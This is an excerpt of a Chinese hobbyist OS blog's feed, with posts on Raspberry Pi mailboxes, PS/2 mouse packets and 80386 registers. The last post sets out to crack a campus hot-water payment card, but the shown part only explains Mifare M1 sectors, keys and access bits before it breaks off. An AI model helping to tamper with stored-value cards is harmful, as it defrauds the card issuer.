+<p>发送：</p>
+<p><div id="container"></div></p>
+<p><div id="content"></div></p>
+<p><div id="content-primary"></div></p>
+<p><div id="contentAll"></div></p>
+<p><div id="pageAll"></div></p>
+<div id="pageBody">
+
+<ol>
+<li>The sender waits until the Status field has a 0 in the top bit.</li>
+<li><p>The sender writes to Write such that the lowest 4 bits are the mailbox to write to, and the upper 28 bits are the message to write.<br>接收:</p>
+</li>
+<li><p>The receiver waits until the Status field has a 0 in the 30th bit.</p>
+</li>
+<li>The receiver reads from Read.</li>
+<li><p>The receiver confirms the message is for the correct mailbox, and tries again if not.<br></p></li></ol></div><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&lt;!– [if IE 6]&gt;<p></p>
+<p><link rel="stylesheet" href="../../../../style/ie6.css" type="text/css" media="screen"><script type="text/javascript" src="http://www.cam.ac.uk/global/js/minmax.js"></script>&lt;![endif]–&gt;<!-- [if IE 7]>
+<link rel="stylesheet" href="../../../../style/ie7.css" type="text/css" media="screen" /><![endif]--><script src="//www.google-analytics.com/analytics.js" async type="mce-no/type"></script><script src="script.js" type="mce-text/javascript" language="javascript"></script><script type="mce-no/type">// &lt;![CDATA[<br>(function(i,s,o,g,r,a,m){i[‘GoogleAnalyticsObject’]=r;i[r]=i[r]||function(){<br>(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),<br>m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)<br>})(window,document,’script’,’//www.google-analytics.com/analytics.js’,’ga’);<br>ga(‘create’, ‘UA-47341509-1’, ‘cam.ac.uk’);<br>ga(‘send’, ‘pageview’);<br>// ]]&gt;</script></p>
+
+
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;要把我的操作系统移植到Raspberry Pi 上了，所以最近一直在看ARM的东西。找来找去只找到一个有点用的 &lt;a href=&quot;http://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/screen01.html#gs&quot; title=&quot;http://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/screen01.html#gs&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/&lt;/a&gt;   剑桥大学的一份教程，虽然离一个完整的内核还差得很远，但对我还算是有点用。之前一直担心的GPU的问题也解决了，也是我找到的唯一一份和Raspberry Pi GPU编程相关的东西了。
+    
+    </summary>
+    
+      <category term="Operating System" scheme="http://0x7c00.com/categories/Operating-System/"/>
+    
+    
+      <category term="汇编" scheme="http://0x7c00.com/tags/%E6%B1%87%E7%BC%96/"/>
+    
+      <category term="GPU" scheme="http://0x7c00.com/tags/GPU/"/>
+    
+      <category term="mailbox" scheme="http://0x7c00.com/tags/mailbox/"/>
+    
+      <category term="图像" scheme="http://0x7c00.com/tags/%E5%9B%BE%E5%83%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PS2鼠标中断信号的处理</title>
+    <link href="http://0x7c00.com/2014/ps2-mouse/"/>
+    <id>http://0x7c00.com/2014/ps2-mouse/</id>
+    <published>2014-12-05T14:02:52.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>键盘数据已经可以正常接收了，鼠标的处理比键盘要稍微复杂一点。鼠标每次的信号是三个字节，第一字节0-2分别保存着鼠标左键右键中键是否按下的标志。3位一直为1。根据这个特性可以判断接收到的字节是否是鼠标第一字节的信号。4 5 两位分别表示鼠标 x，y位置是否发生位移。 6 7  是 x y溢出标志位。<a id="more"></a></p>
+<p>判断是第一个字节后依次接收第二，三个字节。然后将三个字节一起处理。第二字节和第三字节保存着x 位移 和y 位移的补码。也就是说x y 都是带符号的，正号表示正方向，负号表示负方向。X ，Y 的正方向分别为 左 和 下。 这里Y的正方向和我们平时的习惯正好相反。所以计算出来后要加负号。</p>
+<p>还有要注意的就是在鼠标初始化完成的时候会产生一个鼠标中断，0x7A 。要将这一个字节的数据过滤掉，不能算在鼠标信号中。找了一份PS2的协议，下面是鼠标三个字节数据的定义。表格果然直观多了。</p>
+<p>可以处理鼠标信号后要做的第一件事就是让鼠标动起来。 代码很简单，当前坐标加上位移，计算出新坐标重回鼠标就可以。桌面的重绘还没有做。所以会出现 win 移动窗口的特效，真是炫酷 ;-) 。</p>
+<p><img src="http://ccwyy.img43.wal8.com/img43/507648_20150116191603/14217562038.jpeg" alt=""></p>
+<p><strong>Movement Data Packet:</strong></p>
+<p>位移数据包</p>
+<p>The standard PS/2 mouse sends movement (and button) information to the host using the following 3-byte packet (4):</p>
+<p>标准的 PS/2 鼠标发送位移和按键信息给主机采用如下的 3 字节数据包格式见本章脚注 <sub>4           </sub></p>
+<p>&nbsp;</p>
+<p>Bit 7               Bit 6               Bit 5               Bit 4               Bit 3               Bit 2               Bit 1               Bit 0</p>
+<p><table width="567"></table></p>
+<p><tbody></tbody></p>
+<p><tr></tr></p>
+<p><td width="71">Y overflow</td></p>
+<p><td width="71"> X overflow</td></p>
+<p><td width="71">Y sign bit</td></p>
+<p><td width="71">X sign bit</td></p>
+<p><td width="71">Always 1</td></p>
+<p><td width="71">Middle Btn</td></p>
+<p><td width="71">Right Btn</td></p>
+<p><td width="71">Left Btn</td><br></p>
+<p><tr></tr></p>
+<p><td colspan="2" width="142"></td></p>
+<p><td width="71"></td></p>
+<p><td colspan="2" width="142">X Movement</td></p>
+<p><td width="71"></td></p>
+<p><td width="71"></td></p>
+<p><td width="71"></td><br></p>
+<p><tr></tr></p>
+<p><td colspan="2" width="142"></td></p>
+<p><td width="71"></td></p>
+<p><td colspan="2" width="142">Y Movement</td></p>
+<p><td width="71"></td></p>
+<p><td width="71"></td></p>
+<p><td width="71"></td><br><br><br><br>Byte 1 Byte 2</p>
+<p>Byte 3</p>
+<p>&nbsp;</p>
+<p>The movement counters are 9-bit 2’s complement integers, where the most significant bit appears as a sign bit in Byte 1 of the movement data packet. These counters are updated when the mouse reads its input and finds movement has occurred. Their value is the amount of movement that has occurred since the last movement data packet was sent to the host (ie, after a packet is sent to the host, the movement counters are reset.) The range of values that can be expressed by the movement counters is -255 to +255. If this range is exceeded, the appropriate overflow bit is set and the counter is not incremented/decremented until it is reset.</p>
+<p>位移计数器是一个 9 位 2 的补码整数 它的 高位作为符号位出现在位移数据包的第一个字节里 这些计数器在鼠标读取输入发现有位移时被更新 这些值是自从 后一次发送位移数据包给主机后位移的累计量即 后一次包发给主机后 位移计数器被复位  位移计数器可表示的值的范围是-255 到+255 如果超过了范围 相应的溢出位就被设置 并且在复位前 计数器不会增减</p>
+<p>&nbsp;</p>
+<p>As I mentioned earlier, the movement counters are reset whenever a movement data packet is successfully sent to the host. They are also reset after the mouse receives any command from the host other than the “Resend” (0xFE) command.</p>
+<p>正如我前面提及的 一旦位移数据包成功地发送给主机 位移计数器就会复位 同样鼠标在收到主机不是Resend 0xFE 命令外的其他命令 计数器也会复位</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;键盘数据已经可以正常接收了，鼠标的处理比键盘要稍微复杂一点。鼠标每次的信号是三个字节，第一字节0-2分别保存着鼠标左键右键中键是否按下的标志。3位一直为1。根据这个特性可以判断接收到的字节是否是鼠标第一字节的信号。4 5 两位分别表示鼠标 x，y位置是否发生位移。 6 7  是 x y溢出标志位。
+    
+    </summary>
+    
+      <category term="Operating System" scheme="http://0x7c00.com/categories/Operating-System/"/>
+    
+    
+      <category term="PS2" scheme="http://0x7c00.com/tags/PS2/"/>
+    
+      <category term="协议" scheme="http://0x7c00.com/tags/%E5%8D%8F%E8%AE%AE/"/>
+    
+      <category term="鼠标" scheme="http://0x7c00.com/tags/%E9%BC%A0%E6%A0%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>80386寄存器（转载）</title>
+    <link href="http://0x7c00.com/2014/80386-register/"/>
+    <id>http://0x7c00.com/2014/80386-register/</id>
+    <published>2014-11-24T20:00:11.000Z</published>
+    <updated>2017-05-08T17:48:39.567Z</updated>
+    
+    <content type="html"><![CDATA[<p>写这篇文章，完全是因为学习保护模式需要这些知识，读者完全可以走马观花，大致看看有什么内容，知道需要的时候来查这篇文章就可以了，完全没有必要抵抗着困意非要把这篇文章认真看完，<br><a id="more"></a></p>
+<p>记住里面每一个寄存器里每一位的定义，但是以后的文章如果需要，一定要记得回来查查相关的内容。 </p>
+<p>80386共提供7种类型的32位寄存器，如下： </p>
+<ul>
+<li><strong>通用寄存器</strong> (EAX、EBX、ECX、EDX、ESP、EBP、ESI、EDI) </li>
+<li><strong>段寄存器</strong>(CS、SS、DS、ES、FS、GS) </li>
+<li><strong>指令指针寄存器和标志寄存器</strong>(EIP、EFLAGS) </li>
+<li><strong>系统表寄存器</strong>(GDTR、IDTR、LDTR、TR) </li>
+<li><strong>控制寄存器</strong>(CR0、CR1、CR2、CR3、CR4) </li>
+<li><strong>调试寄存器</strong>(DR0、DR1、DR2、DR3、DR4、DR5、DR6、DR7) </li>
+<li><strong>测试寄存器</strong>(TR6、TR7) </li>
+</ul>
+<p>其中后三类寄存器是80386以后的CPU才有的，以前的CPU完全没有。<br>下图是前四类寄存器的大致示意图：<br><img src="https://pic.0x7c00.cn/blog/80386-register/1.jpg" alt="pic-1"><br>本文只对这些寄存器做一个大致的介绍，其中有些特殊且有较大意义的寄存器，会另文介绍。 </p>
+<p>一、通用寄存器<br>一组八个通用寄存器是对8086/80286通用寄存器的32位扩展，其用法与在8086/80286中相似，<br>支持8位、16位、32位操作，进行32位操作是，寄存器名称前面冠以“E”。<br>这八个寄存器的名称如下：<br>EAX（累加器）、EBX（基址）、ECX（计数）、EDX（数据）、ESP（栈指针）、EBP（基址指针）、ESI（源变址）、EDI（目的变址）。 </p>
+<p>二、段寄存器<br>80386比8086/80286增加了两个段寄存器FS、GS。<br>除CS支持代码段，SS支持堆栈段外，程序员可以利用其它的所有段寄存器支持数据段。<br>每个段寄存器对应这一个64位高速缓存器（有些资料中说有96位，但值使用其中的64位），<br>这在8086中是没有的（在80286中为48位），它的具体作用将另文介绍。 </p>
+<p>三、指令指针寄存器和标志寄存器<br>指令寄存器EIP是对8086/80286指令指针寄存器的32位扩展，它包含着待执行指令的32位偏移量，<br>该值总是相对CS所代表的段基址而言的。 标志寄存器也是对8086/80286标志寄存器的32位扩展，<br>其定义如下（这张图截自Intel关于IA32架构的最新文档）：<br><img src="https://pic.0x7c00.cn/blog/80386-register/2.jpg" alt="pic-1"><br>其中OF、DF、IF、TF、SF、ZF、AF、PF和CF在8086中就已经存在，<br>请参考相关资料。 IOPL（I/O Privilege Level）是从80286开始出现的，占2个bit表示I/O特权级，<br>如果当前特权级小于或等于IOPL，则可以执行I/O操作，否则将出现一个保护性异常。<br>IOPL只能由特权级为0的程序或任务来修改。<br>NT（Nested Task）也是从80286开始出现的，表示嵌套任务，用于控制中断返回指令IRET，当NT=0时，<br>用堆栈中保存的值恢复EFLAGS、CS和EIP，从而实现返回；若NT=1，则通过任务切换实现中断返回。<br>下面的标志位是80386以后的CPU才有的标志。 VM（Virtual-8086 mode）表示虚拟8086模式，<br>如果VM被置位且80386已出于保护模式下，则CPU切换到虚拟8086模式，此时，对段的任何操作又回到了实模式，<br>如同在8086下运行一样。 RF（Resume flag）表示恢复标志(也叫重启标志)，与调试寄存器一起用于断点和单步操作，<br>当RF＝1 时，下一条指令的任何调试故障将被忽略，不产生异常中断。当RF=0时，调试故障被接受，并产生异常中断。<br>用于调试失败后，强迫程序恢复执行，在成功执行每条指令后，RF自动复位。 AC（Alignment check）表示对齐检查。<br>这个标志是80486以后的CPU才有的。当AC=1且CR0中的AM=1时，允许存储器进行地址对齐检查，若发现地址未对齐，<br>将产生异常中断。所谓地址对齐，是指当访问一个字（2字节长）时，其地址必须是偶数（2的倍数），当访问双字（4字节长）时，<br>其地址必须是4的倍数。 但是只有运行在特权级3的程序才执行地址对齐检查，特权级0、1、2忽略该标志。<br>VIF（Virtual interrupt flag）表示虚拟中断标志。以下的三个标志是Pentium以后的CPU才有的。<br>当VIF=1时，可以使用虚拟中断，当VIF=0时不能使用虚拟中断。该标志要和下面的VIP和CR4中的VME配合使用。<br>VIP（Virtual interrupt pending flag）表示虚拟中断挂起标志。当VIP=1时，VIF有效，VIP=0时VIF无效。<br>ID（Identification flag）表示鉴别标志。该标志用来只是Pentium CPU是否支持CPUID的指令。<br>实际上，如果不编写操作系统，大部分标志可能很难得用到一次，有个印象就好了，用到了再去查不迟。 </p>
+<p>四、系统表寄存器<br>80386 中有4个系统表寄存器，分别是</p>
+<ul>
+<li>全局描述符表寄存器(GDTR)</li>
+<li>中断描述符表寄存器(IDTR)</li>
+<li>局部描述符表寄存器(LDTR)</li>
+<li>任务状态寄存器(TR)<br>系统表寄存器用于在保护方式下，管理4 个系统表，由于只能在保护方式下使用，因此又称为保护方式寄存器。<br>有关描述附表的问题，另文介绍。 </li>
+</ul>
+<p>五、控制寄存器<br>80386的控制寄存器有4个,其中CR1保留以后使用，从Pentium开始，又增加了一个CR4，<br>CR0的低16位包含了与80286的MSW一致的位定义，保持了和80286的兼容，同时也兼容了从80286开始的两条指令LMSW/SMSW，<br>其基本定义如下： CR0中各位含义如下： PE（Protection Enable）保护模式允许，PE=0表示CPU工作在实模式，<br>PE=1表示CPU工作在保护模式 MP（Monitor Coprocessor）监控协处理器，MP=1表示协处理器在工作，MP=0表示协处理器未工作。<br>EM（Emulation）协处理器仿真，当MP=0，EM=1时，表示正在使用软件仿真协处理器工作。 TS（Task Switched）任务转换，<br>每当进行任务转换时，TS=1，任务转换完毕，TS=0。TS=1时不允许协处理器工作。 以上4个定义从80286开始，<br>下面的2个定义从80386开始存在 ET（Extension Type）处理器扩展类型，反映了所扩展的协处理器的类型，<br>ET=0为80287，ET=1为80387。 PG（Paging）页式管理机制使能，PG=1时页式管理机制工作，否则不工作。<br>从80486开始又增加了如下位定义。 NE（Numeric Error）数值异常中断控制，NE=1时，如果运行协处理器指令发生故障，<br>则用异常中断处理，NE=0时，则用外部中断处理。 WP（Write Protect）写保护，当WP=1时，对只读页面进行写操作会产生页故障。<br>AM（Alignment Mask）对齐标志，AM=1时，允许对齐检查，AM=0时不允许，关于对齐，在EFLAGS的AC标志时介绍过，在80486以后的CPU中，<br>CPU进行对齐检查需要满足三个条件，AC=1、AM=1并且当前特权级为3。 NW（Not Write-through）和CD（Cache Disable），<br>这两个标志都是用来控制CPU内部的CACHE的，当NW=0且CD=0时，CACHE使能，其它的组合说起来比较复杂，如果有读者真的想搞清楚的话，<br>可以参阅《Intel? 64 and IA-32 Architectures》中的“Software Developer’s Manual Volume 3A”这一册，<br>在第10章对这两个标志的各种组合有比较详细的说明。 CR1保留未用；CR2存放引起页故障的线性地址，只有在PG=1时，<br>CR2才有效，当页故障处理程序被激活时，压入页故障处理程序堆栈中的错误码提供页故障的状态信息。<br>CR3的bit12–bit31存放页目录的基地址，因为也目录总是页对齐的（一页为4K），所以页目录基地址从bit12开始就可以了。<br>只有当CR0中的PG=1时，CR3的页目录基地址才有效。 从80486开始，在CR3的低12位定义了两个控制位，如下：<br><img src="https://pic.0x7c00.cn/blog/80386-register/3.jpg" alt="pic-3"><br>PCD（Page-level Cache Disable）页CACHE禁止，当PCD=0时，页目录表进行高速缓存，PCD=1时，不进行高速缓存；<br>该位控制PCD引脚控制外部CACHE工作还是不工作。 PWT（Page-level Writes Transparent），CACHE的写入分为透写<br>（Write-Through）和回写（Write-Back）,80486以上的CPU内部的CACHE都是透写的，但对外部CACHE而言，允许某些页是回写的，<br>而另一些页是透写的，当PWT=1时，外部CACHE对页目录进行透写，否则进行回写；此位驱动PWT引脚以控制外部CACHE是透写还是回写。<br>CR4是从Pentium CPU开始出现的。 VME（Virtual-8086 Mode Extensions）虚拟8086方式扩展，VME=1允许使用虚拟8086扩展模式，<br>否则只能使用80386/80486的虚拟8086模式。 PVI（Protected-Mode Virtual Interrupts）保护模式虚拟中断，PVI=1时，<br>在保护模式下支持虚拟中断标志VIF(EFLAGS中)，PVI=0则不支持虚拟中断标志。 TSD（Time Stamp Disable）时间戳禁止，TSD=1时，<br>允许在特权级为0的程序中执行RDTSC指令（读时间戳计数指令），TSD=0时，允许任何特权级执行RDTSC指令。 DE（Debugging Extensions）<br>调试扩展， PSE（Page Size Extensions）页大小扩展，PSE=1时，页大小可以扩展到2M或4M，PSE=0时，页大小只能是4K.<br>PAE（Physical Address Extension）物理地址扩展，PAE=1时，页物理地址可以扩展到36bits以上，PAE=0时只能用32bits的物理地址。<br>MCE（Machine-Check Enable）硬件检查使能，Pentium以后的CPU有一种硬件检测功能，MCE=1时允许使用该功能。<br>PGE（Page Global Enable）全局页使能，PGE=1时，允许使用全局页，PGE=0时禁止使用全局页。 PCE（Performance-Monitoring Counter Enable）<br>性能监视计数器使能，当PCE=1时，允许在任何保护级下执行RDPMC指令，PCE=0时，只有特权级0的程序可以执行RDPMC指令。<br>OSFXSR（Operating System Support for FXSAVE and FXRSTOR instructions）<br>OSXMMEXCPT（Operating System Support for Unmasked SIMD Floating-Point Exceptions）<br>VMXE（VMX-Enable Bit）VMX使能位，VMXE=1时，允许VMX操作。<br>SMXE（SMX-Enable Bit）SMX使能位，SMXE=1时，允许SMX操作。<br>OSXSAVE（XSAVE and Processor Extended States-Enable Bit） </p>
+<p>六、调试寄存器<br>一共有8个调试寄存器DR0–DR7，DR0-DR3可以分别设置4个断点的线性地址，DR4-DR5保留未用，DR6是断点状态寄存器，<br>DR7是断点控制寄存器（包括断点类型、断点长度，断点开放/禁止） 七、测试寄存器 一共有8个测试寄存器TR0–TR7，<br>TR0-TR2保留，TR3-TR5用作CACHE测试，TR6为命令测试寄存器，TR7为测试数据寄存器。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;写这篇文章，完全是因为学习保护模式需要这些知识，读者完全可以走马观花，大致看看有什么内容，知道需要的时候来查这篇文章就可以了，完全没有必要抵抗着困意非要把这篇文章认真看完，&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Operating System" scheme="http://0x7c00.com/categories/Operating-System/"/>
+    
+    
+      <category term="80386" scheme="http://0x7c00.com/tags/80386/"/>
+    
+      <category term="寄存器" scheme="http://0x7c00.com/tags/%E5%AF%84%E5%AD%98%E5%99%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>热水卡破解</title>
+    <link href="http://0x7c00.com/2014/M1-card-crack/"/>
+    <id>http://0x7c00.com/2014/M1-card-crack/</id>
+    <published>2014-11-22T05:18:36.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天遇到点烦心事，只看了GDT（Global Descriptor Table）相关的内容，没有继续完成操作系统的引导部分。不过晚上热水卡没有钱了，刚好今天OS没有大的进展，顿时萌生了“自力更生，丰衣足食”的良好念头 :-)   。</p>
+<a id="more"></a>
+<p>M1卡，全程NXP Mifare1 卡。现在日常接触到的大部分都是M1卡。学校的所有卡，包括公交卡、甚至学校饭卡。</p>
+<p><strong>  0X00  先从M1卡的结构说起吧</strong></p>
+<ul>
+<li>存储结构</li>
+<li><p>M1卡分为16个扇区，每个扇区由4块（块0、块1、块2、块3）组成，（我们也将16个扇区的64个块按绝对地址编号为0~63，存贮结构如下图所示：</p>
+<table><br><tbody><br><tr><br><td width="60"></td><br><td width="48"></td><br><td width="204"></td><br><td width="72"></td><br><td width="48"></td><br></tr><br><tr><br><td width="60"></td><br><td width="48">块0</td><br><td width="204"></td><br><td width="72">数据块</td><br><td width="48">0</td><br></tr><br><tr><br><td width="60">扇区0</td><br><td width="48">块1</td><br><td width="204"></td><br><td width="72">数据块</td><br><td width="48">1</td><br></tr><br><tr><br><td width="60"></td><br><td width="48">块2</td><br><td width="204"></td><br><td width="72">数据块</td><br><td width="48">2</td><br></tr><br><tr><br><td width="60"></td><br><td width="48">块3</td><br><td width="204">密码A   存取控制   密码B</td><br><td width="72">控制块</td><br><td width="48">3</td><br></tr><br><tr><br><td width="60"></td><br><td width="48">块0</td><br><td width="204"></td><br><td width="72">数据块</td><br><td width="48">4</td><br></tr><br><tr><br><td width="60">扇区1</td><br><td width="48">块1</td><br><td width="204"></td><br><td width="72">数据块</td><br><td width="48">5</td><br></tr><br><tr><br><td width="60"></td><br><td width="48">块2</td><br><td width="204"></td><br><td width="72">数据块</td><br><td width="48">6</td><br></tr><br><tr><br><td width="60"></td><br><td width="48">块3</td><br><td width="204">密码A   存取控制   密码B</td><br><td width="72">控制块</td><br><td width="48">7</td><br></tr><br><tr><br><td width="60"></td><br><td width="48"> 一直到15</td><br><td width="204"></td><br><td width="72"></td><br><td width="48"></td><br></tr><br></tbody><br></table>
+</li>
+<li><p>第0扇区的块0（即绝对地址0块），它用于存放厂商代码，已经固化，不可更改。</p>
+</li>
+<li><p>每个扇区的块0、块1、块2为<strong>数据块</strong>，可用于存贮数据。<br><strong>数据块</strong>可作两种应用：</p>
+</li>
+<li><p>用作一般的数据保存，可以进行<strong>读</strong>、<strong>写</strong>操作。</p>
+</li>
+<li>用作数据值，可以进行<strong>初始化值、加值、减值、读值</strong>操作。</li>
+<li>每个扇区的块3为<strong>控制块</strong>，包括了密码A、存取控制、密码B。具体结构如下：<br><table><br><tbody><br><tr><br><td width="402"><br><table width="100%"><br><tbody><br><tr><br><td>A0 A1 A2 A3 A4 A5   FF 07 80 69     B0 B1 B2 B3 B4 B5</td><br></tr><br></tbody><br></table><br></td><br></tr><br></tbody><br></table><br>密码A（6字节）  存取控制（4字节） 密码B（6字节）</li>
+</ul>
+<p>每个扇区的密码和存取控制都是独立的，可以根据实际需要设定各自的密码及存取控制。存取控制为4个字节，共32位，扇区中的每个块（包括数据块和控制块）的存取条件是由密码和存取控制共同决定的，在<strong>存取控制</strong>中每个块都有相应的<strong>三个控制位</strong>,定义如下：</p>
+<p>块0：   C10   C20   C30</p>
+<p>块1：   C11   C21   C31</p>
+<p>块2：   C12   C22   C32</p>
+<p>块3：   C13   C23   C33</p>
+<p>三个控制位以正和反两种形式存在于存取控制字节中，决定了该块的访问权限（如</p>
+<p>进行减值操作必须验证KEY A，进行加值操作必须验证KEY B，等等）。三个控制</p>
+<p>位在存取控制字节中的位置，以块0为例：</p>
+<p>&nbsp;</p>
+<p>对块0的控制：</p>
+<p>bit  7    6     5       4     3      2      1      0</p>
+<p><table></table></p>
+<p><tbody></tbody></p>
+<p><tr></tr></p>
+<p><td width="72">字节6</td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48">C20_b</td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48">C10_b</td><br></p>
+<p><tr></tr></p>
+<p><td width="72">字节7</td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48">C10</td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48">C30_b</td><br></p>
+<p><tr></tr></p>
+<p><td width="72">字节8</td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48">C30</td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48">C20</td><br></p>
+<p><tr></tr></p>
+<p><td width="72">字节9</td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td><br><br><br><br>( 注： C10_b表示C10取反 )</p>
+<p>&nbsp;</p>
+<p>存取控制（4字节，其中字节9为备用字节）结构如下所示：</p>
+<p>bit  7    6      5       4     3      2      1      0</p>
+<p><table></table></p>
+<p><tbody></tbody></p>
+<p><tr></tr></p>
+<p><td width="72">字节6</td></p>
+<p><td width="48">C23_b</td></p>
+<p><td width="48">C22_b</td></p>
+<p><td width="48">C21_b</td></p>
+<p><td width="48">C20_b</td></p>
+<p><td width="48">C13_b</td></p>
+<p><td width="48">C12_b</td></p>
+<p><td width="48">C11_b</td></p>
+<p><td width="48">C10_b</td><br></p>
+<p><tr></tr></p>
+<p><td width="72">字节7</td></p>
+<p><td width="48">C13</td></p>
+<p><td width="48">C12</td></p>
+<p><td width="48">C11</td></p>
+<p><td width="48">C10</td></p>
+<p><td width="48">C33_b</td></p>
+<p><td width="48">C32_b</td></p>
+<p><td width="48">C31_b</td></p>
+<p><td width="48">C30_b</td><br></p>
+<p><tr></tr></p>
+<p><td width="72">字节8</td></p>
+<p><td width="48">C33</td></p>
+<p><td width="48">C32</td></p>
+<p><td width="48">C31</td></p>
+<p><td width="48">C30</td></p>
+<p><td width="48">C23</td></p>
+<p><td width="48">C22</td></p>
+<p><td width="48">C21</td></p>
+<p><td width="48">C20</td><br></p>
+<p><tr></tr></p>
+<p><td width="72">字节9</td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td><br><br><br><br>( 注： _b表示取反 )</p>
+<p>&nbsp;</p>
+<p>6、<strong>数据块</strong>（块0、块1、块2）的存取控制如下：</p>
+<p>&nbsp;</p>
+<p><table></table></p>
+<p><tbody></tbody></p>
+<p><tr></tr></p>
+<p><td colspan="3" width="144">  控制位（X=0..2）</td></p>
+<p><td colspan="4" width="312">         访 问 条 件 （对数据块 0、1、2）</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">C1X</td></p>
+<p><td width="48">C2X</td></p>
+<p><td width="48">C3X</td></p>
+<p><td width="60"> Read</td></p>
+<p><td width="60"> Write</td></p>
+<p><td width="72">Increment</td></p>
+<p><td width="120">Decrement, transfer,Restore</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">0</td></p>
+<p><td width="48">0</td></p>
+<p><td width="48">0</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="72">KeyA|B</td></p>
+<p><td width="120">KeyA|B</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">0</td></p>
+<p><td width="48">1</td></p>
+<p><td width="48">0</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="72">Never</td></p>
+<p><td width="120">Never</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">1</td></p>
+<p><td width="48">0</td></p>
+<p><td width="48">0</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyB</td></p>
+<p><td width="72">Never</td></p>
+<p><td width="120">Never</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">1</td></p>
+<p><td width="48">1</td></p>
+<p><td width="48">0</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyB</td></p>
+<p><td width="72">KeyB</td></p>
+<p><td width="120">KeyA|B</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">0</td></p>
+<p><td width="48">0</td></p>
+<p><td width="48">1</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="72">Never</td></p>
+<p><td width="120">KeyA|B</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">0</td></p>
+<p><td width="48">1</td></p>
+<p><td width="48">1</td></p>
+<p><td width="60">KeyB</td></p>
+<p><td width="60">KeyB</td></p>
+<p><td width="72">Never</td></p>
+<p><td width="120">Never</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">1</td></p>
+<p><td width="48">0</td></p>
+<p><td width="48">1</td></p>
+<p><td width="60">KeyB</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="72">Never</td></p>
+<p><td width="120">Never</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">1</td></p>
+<p><td width="48">1</td></p>
+<p><td width="48">1</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="72">Never</td></p>
+<p><td width="120">Never</td><br><br><br><br>（KeyA|B 表示密码A或密码B，Never表示任何条件下不能实现）</p>
+<p>&nbsp;</p>
+<p>例如：当块0的存取控制位C10 C20 C30=1 0 0时，验证密码A或密码B正确后可读；</p>
+<p>验证密码B正确后可写；不能进行加值、减值操作。</p>
+<p>&nbsp;</p>
+<p>7、<strong>控制块</strong>块3的存取控制与<strong>数据块</strong>（块0、1、2）不同，它的存取控制如下：</p>
+<p>&nbsp;</p>
+<p><table></table></p>
+<p><tbody></tbody></p>
+<p><tr></tr></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td width="48"></td></p>
+<p><td colspan="2" width="120"><strong>密码A</strong></td></p>
+<p><td colspan="2" width="120"><strong>存取控制</strong></td></p>
+<p><td colspan="2" width="120"><strong>密码B</strong></td><br></p>
+<p><tr></tr></p>
+<p><td width="48">C13</td></p>
+<p><td width="48">C23</td></p>
+<p><td width="48">C33</td></p>
+<p><td width="60">Read</td></p>
+<p><td width="60">Write</td></p>
+<p><td width="60">Read</td></p>
+<p><td width="60">Write</td></p>
+<p><td width="60">Read</td></p>
+<p><td width="60">Write</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">0</td></p>
+<p><td width="48">0</td></p>
+<p><td width="48">0</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyA|B</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">0</td></p>
+<p><td width="48">1</td></p>
+<p><td width="48">0</td></p>
+<p><td width="60">Never</td></p>
